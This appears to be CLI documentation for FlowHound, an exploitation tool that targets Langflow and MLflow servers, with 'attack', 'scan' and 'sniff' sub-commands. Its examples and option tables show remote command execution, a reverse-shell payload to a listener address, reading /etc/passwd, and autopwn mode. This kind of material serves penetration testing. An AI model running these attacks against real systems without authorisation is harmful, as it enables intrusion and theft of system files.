# CLI Overview

FlowHound exposes a single entry point, `flowhound`, with three sub-commands: [`attack`](attack.md), [`scan`](scan.md), and [`sniff`](sniff.md).

```
flowhound [OPTIONS] COMMAND [ARGS]...
```

The top-level group accepts `-h` / `--help` as the help flag. Each sub-command inherits the same flag names.

---

## Global options

| Flag | Description |
|---|---|
| `-h`, `--help` | Show help text and exit |

---

## Commands

### `attack`

Launch one or more exploits against a target instance.

```
flowhound attack --url <URL> [OPTIONS]
```

| Option | Required | Type | Description |
|---|---|---|---|
| `--url` | Yes | URL | URL of the target instance (e.g. `http://localhost:7860`) |
| `--username` | No | string | Target username — must be paired with `--password` |
| `--password` | No | string | Target password — must be paired with `--username` |
| `--autopwn` | No | flag | Run all matching exploits instead of stopping at the first success |
| `--proxy` | No | URL | HTTP(S) proxy to route all traffic through (e.g. `http://127.0.0.1:8080`) |
| `--command` | No | string | Shell command to run on the target via the `execute_bash_command` payload |
| `--reverse_shell` | No | `LHOST:LPORT` | Reverse TCP shell payload target (e.g. `192.168.1.10:4444`) |
| `--application` | No | string | Target application name (`langflow` or `mlflow`). Skips auto-detection when provided |
| `--cve` | No | string | Limit execution to a single CVE (e.g. `CVE-2026-9198`) |
| `-h`, `--help` | No | — | Show help text and exit |

**Constraints:**

- `--command` and `--reverse_shell` are mutually exclusive.
- `--username` and `--password` must always be supplied together.

---

### `scan`

Launch an auxiliary module against a target instance.

```
flowhound scan --url <URL> --cve <CVE> [OPTIONS]
```

| Option | Required | Type | Description |
|---|---|---|---|
| `--url` | Yes | URL | URL of the target instance |
| `--cve` | Yes | string | Target auxiliary CVE identifier (e.g. `CVE-2023-1177`) |
| `--f_path` | No | string | File path to read from (e.g. `/etc/passwd`) |
| `--username` | No | string | Target username — must be paired with `--password` |
| `--password` | No | string | Target password — must be paired with `--username` |
| `--proxy` | No | URL | HTTP(S) proxy to route all traffic through |
| `-h`, `--help` | No | — | Show help text and exit |

---

### `sniff`

Detect the target application and version, then list all applicable CVEs without launching exploits.

```
flowhound sniff --url <URL> [OPTIONS]
```

| Option | Required | Type | Description |
|---|---|---|---|
| `--url` | Yes | URL | URL of the target instance |
| `--proxy` | No | URL | HTTP(S) proxy to route all traffic through |
| `--application` | No | string | Target application name (`langflow` or `mlflow`). Skips auto-detection when provided |
| `-h`, `--help` | No | — | Show help text and exit |

---

## URL validation

Both commands validate the `--url` and `--proxy` values at startup. Accepted schemes are `http` and `https`. A missing or malformed scheme causes an immediate `BadParameter` error before any network traffic is sent.

---

## CVE validation

The `--cve` value is validated against the pattern `CVE-YYYY-NNNNN[NNN]` (case-insensitive) before any network traffic is sent. Invalid formats cause an immediate `BadParameter` error.

---

## Application validation

The `--application` value is lowercased and checked against the set of supported application names returned by `supported_applications()`. Unsupported values cause an immediate `BadParameter` error listing the valid options.

---

## Exit behaviour

| Condition | Exit code |
|---|---|
| Normal exit | `0` |
| Click usage error (bad options) | `2` |
| Runtime error (e.g. unreachable target) | `1` |

---

## Examples

```bash
# Show top-level help
flowhound --help

# Show attack help
flowhound attack --help

# Show sniff help
flowhound sniff --help

# Unauthenticated attack, stop at first success
flowhound attack --url http://target.example.com:7860

# Authenticated attack
flowhound attack --url http://target.example.com:7860 --username admin --password secret

# All exploits with a custom command payload
flowhound attack --url http://target.example.com:7860 --autopwn --command "id"

# Reverse shell
flowhound attack --url http://target.example.com:7860 --reverse_shell 192.168.1.10:4444

# Route traffic through Burp Suite
flowhound attack --url http://target.example.com:7860 --proxy http://127.0.0.1:8080

# Target Langflow directly (skip auto-detection)
flowhound attack --url http://target.example.com:7860 --application langflow

# Target a single exploit CVE
flowhound attack --url http://target.example.com:7860 --cve CVE-2026-9198

# Run an auxiliary scan module
flowhound scan --url http://target.example.com:5000 --cve CVE-2023-1177 --f_path /etc/passwd

# Version detection only
flowhound sniff --url http://target.example.com:7860

# Version detection for MLflow
flowhound sniff --url http://target.example.com:5000 --application mlflow
```
